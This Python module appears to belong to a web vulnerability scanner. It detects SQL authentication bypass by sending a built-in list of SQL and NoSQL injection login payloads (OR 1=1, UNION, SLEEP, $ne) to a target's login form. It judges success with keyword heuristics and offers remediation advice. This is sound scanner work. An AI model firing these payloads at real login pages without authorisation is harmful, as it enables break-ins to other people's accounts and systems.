"""
SQL Authentication Bypass detection logic
"""

import requests
import re
from typing import List, Dict, Any, Tuple

class SQLAuthBypassDetector:
    """SQL Authentication Bypass detection logic"""
    
    @staticmethod
    def get_sql_bypass_payloads() -> List[Dict[str, str]]:
        """Get SQL injection payloads for authentication bypass"""
        return [
            # Classic SQL injection bypasses
            {'username': "admin'--", 'password': 'anything'},
            {'username': "admin'/*", 'password': 'anything'},
            {'username': "admin' OR '1'='1'--", 'password': 'anything'},
            {'username': "admin' OR '1'='1'/*", 'password': 'anything'},
            {'username': "admin' OR 1=1--", 'password': 'anything'},
            {'username': "admin' OR 1=1/*", 'password': 'anything'},
            
            # Union-based bypasses
            {'username': "admin' UNION SELECT 1,1,1--", 'password': 'anything'},
            {'username': "admin' UNION SELECT null,null,null--", 'password': 'anything'},
            
            # Boolean-based bypasses
            {'username': "admin' OR 'a'='a'--", 'password': 'anything'},
            {'username': "admin' OR 'x'='x'--", 'password': 'anything'},
            {'username': "admin' OR true--", 'password': 'anything'},
            
            # Password field bypasses
            {'username': 'admin', 'password': "' OR '1'='1'--"},
            {'username': 'admin', 'password': "' OR 1=1--"},
            {'username': 'admin', 'password': "' OR 'a'='a'--"},
            
            # Both fields bypass
            {'username': "' OR '1'='1'--", 'password': "' OR '1'='1'--"},
            {'username': "' OR 1=1--", 'password': "' OR 1=1--"},
            
            # Time-based bypasses
            {'username': "admin'; WAITFOR DELAY '00:00:05'--", 'password': 'anything'},
            {'username': "admin' AND SLEEP(5)--", 'password': 'anything'},
            
            # Error-based bypasses
            {'username': "admin' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", 'password': 'anything'},
            {'username': "admin' AND (SELECT COUNT(*) FROM sysobjects)>0--", 'password': 'anything'},
            
            # NoSQL bypasses
            {'username': "admin", 'password': '{"$ne": null}'},
            {'username': '{"$ne": null}', 'password': '{"$ne": null}'},
            {'username': "admin", 'password': '{"$gt": ""}'},
            
            # Advanced bypasses
            {'username': "admin'||'1'='1", 'password': 'anything'},
            {'username': "admin' AND '1'='1", 'password': 'anything'},
            {'username': "admin' LIMIT 1--", 'password': 'anything'},
        ]
    
    @staticmethod
    def detect_sql_auth_bypass(url: str, form_info: Dict[str, Any], 
                              headers: Dict[str, str] = None, timeout: int = 10) -> List[Dict[str, Any]]:
        """
        Detect SQL authentication bypass vulnerabilities
        Returns list of successful bypass attempts
        """
        if not form_info or not form_info.get('password_field'):
            return []
        
        results = []
        payloads = SQLAuthBypassDetector.get_sql_bypass_payloads()
        
        # Build form URL
        action = form_info.get('action', '')
        if action.startswith('/'):
            from urllib.parse import urlparse
            parsed = urlparse(url)
            form_url = f"{parsed.scheme}://{parsed.netloc}{action}"
        elif action.startswith('http'):
            form_url = action
        else:
            form_url = f"{url.rstrip('/')}/{action}" if action else url
        
        print(f"    [SQLAUTHBYPASS] Testing {len(payloads)} SQL bypass payloads...")
        
        for i, payload in enumerate(payloads, 1):
            try:
                print(f"    [SQLAUTHBYPASS] Testing payload {i}/{len(payloads)}: {payload['username'][:30]}...")
                
                # Prepare form data
                form_data = {}
                
                # Add username and password
                if form_info.get('username_field'):
                    form_data[form_info['username_field']] = payload['username']
                
                form_data[form_info['password_field']] = payload['password']
                
                # Add other form fields
                for input_name in form_info.get('all_inputs', []):
                    if input_name not in form_data:
                        input_lower = input_name.lower()
                        if 'submit' in input_lower or 'button' in input_lower:
                            continue
                        elif 'csrf' in input_lower or 'token' in input_lower:
                            form_data[input_name] = 'test_token'
                        else:
                            form_data[input_name] = 'test'
                
                # Make request
                method = form_info.get('method', 'POST').upper()
                
                if method == 'POST':
                    response = requests.post(
                        form_url,
                        data=form_data,
                        headers=headers or {},
                        timeout=timeout,
                        verify=False,
                        allow_redirects=True
                    )
                else:
                    response = requests.get(
                        form_url,
                        params=form_data,
                        headers=headers or {},
                        timeout=timeout,
                        verify=False,
                        allow_redirects=True
                    )
                
                print(f"    [SQLAUTHBYPASS] Response code: {response.status_code}")
                
                # Analyze response for bypass success
                is_bypass, evidence = SQLAuthBypassDetector._analyze_bypass_response(
                    response.text, response.status_code, payload
                )
                
                if is_bypass:
                    print(f"    [SQLAUTHBYPASS] SQL AUTH BYPASS FOUND! Payload: {payload['username']}")
                    
                    results.append({
                        'payload': payload,
                        'response_code': response.status_code,
                        'evidence': evidence,
                        'response_text': response.text[:500],
                        'form_url': form_url,
                        'bypass_type': SQLAuthBypassDetector._classify_bypass_type(payload)
                    })
                    
                    # Don't break - continue testing to find all bypasses
                
                # Small delay to avoid overwhelming the server
                import time
                time.sleep(0.1)
                
            except Exception as e:
                print(f"    [SQLAUTHBYPASS] Error testing payload: {e}")
                continue
        
        return results
    
    @staticmethod
    def _analyze_bypass_response(response_text: str, response_code: int, payload: Dict[str, str]) -> Tuple[bool, str]:
        """Analyze response to determine if SQL bypass was successful"""
        response_lower = response_text.lower()
        
        # Strong success indicators
        strong_success_indicators = [
            'welcome', 'dashboard', 'logout', 'profile', 'admin panel',
            'control panel', 'management', 'settings', 'успешно',
            'добро пожаловать', 'панель управления'
        ]
        
        # Failure indicators
        failure_indicators = [
            'invalid', 'incorrect', 'wrong', 'failed', 'error', 'denied',
            'login failed', 'authentication failed', 'неверный', 'ошибка'
        ]
        
        # SQL error indicators (might indicate successful injection)
        sql_error_indicators = [
            'sql syntax', 'mysql', 'ora-', 'postgresql', 'sqlite',
            'syntax error', 'database error', 'query failed'
        ]
        
        # Count indicators
        success_count = sum(1 for indicator in strong_success_indicators if indicator in response_lower)
        failure_count = sum(1 for indicator in failure_indicators if indicator in response_lower)
        sql_error_count = sum(1 for indicator in sql_error_indicators if indicator in response_lower)
        
        # Determine if bypass was successful
        if response_code in [200, 302, 303]:
            if success_count > 0 and failure_count == 0:
                return True, f"Authentication bypass successful - found success indicators: {success_count}"
            elif success_count > failure_count:
                return True, f"Likely authentication bypass - success indicators: {success_count}, failure: {failure_count}"
            elif sql_error_count > 0 and failure_count == 0:
                return True, f"Possible SQL injection bypass - SQL errors detected: {sql_error_count}"
        
        # Check for redirect patterns that might indicate success
        if response_code in [302, 303]:
            # Look for redirects to admin/dashboard pages
            redirect_patterns = ['admin', 'dashboard', 'panel', 'home', 'main']
            if any(pattern in response_lower for pattern in redirect_patterns):
                return True, f"Authentication bypass via redirect - Status: {response_code}"
        
        return False, f"No bypass detected - Status: {response_code}, Success: {success_count}, Failure: {failure_count}"
    
    @staticmethod
    def _classify_bypass_type(payload: Dict[str, str]) -> str:
        """Classify the type of SQL bypass"""
        username = payload['username'].lower()
        password = payload['password'].lower()
        
        if 'union' in username or 'union' in password:
            return 'Union-based bypass'
        elif 'waitfor' in username or 'sleep' in username:
            return 'Time-based bypass'
        elif 'information_schema' in username or 'sysobjects' in username:
            return 'Error-based bypass'
        elif '$ne' in password or '$gt' in password:
            return 'NoSQL bypass'
        elif "or '1'='1'" in username or "or '1'='1'" in password:
            return 'Boolean-based bypass'
        elif '--' in username or '/*' in username:
            return 'Comment-based bypass'
        else:
            return 'Generic SQL bypass'
    
    @staticmethod
    def get_evidence(bypass_results: List[Dict[str, Any]]) -> str:
        """Get evidence of SQL authentication bypass"""
        if not bypass_results:
            return "No SQL authentication bypass detected"
        
        evidence_parts = []
        for result in bypass_results[:3]:  # Show first 3 results
            payload = result['payload']
            bypass_type = result['bypass_type']
            evidence_parts.append(f"{bypass_type}: {payload['username']}")
        
        return f"SQL Authentication Bypass detected: {', '.join(evidence_parts)}"
    
    @staticmethod
    def get_remediation_advice() -> str:
        """Get remediation advice for SQL authentication bypass"""
        return (
            "Use parameterized queries/prepared statements for all database operations. "
            "Implement proper input validation and sanitization. "
            "Use stored procedures with parameterized inputs. "
            "Apply principle of least privilege for database accounts. "
            "Implement proper error handling to avoid information disclosure. "
            "Use ORM frameworks that provide SQL injection protection."
        )
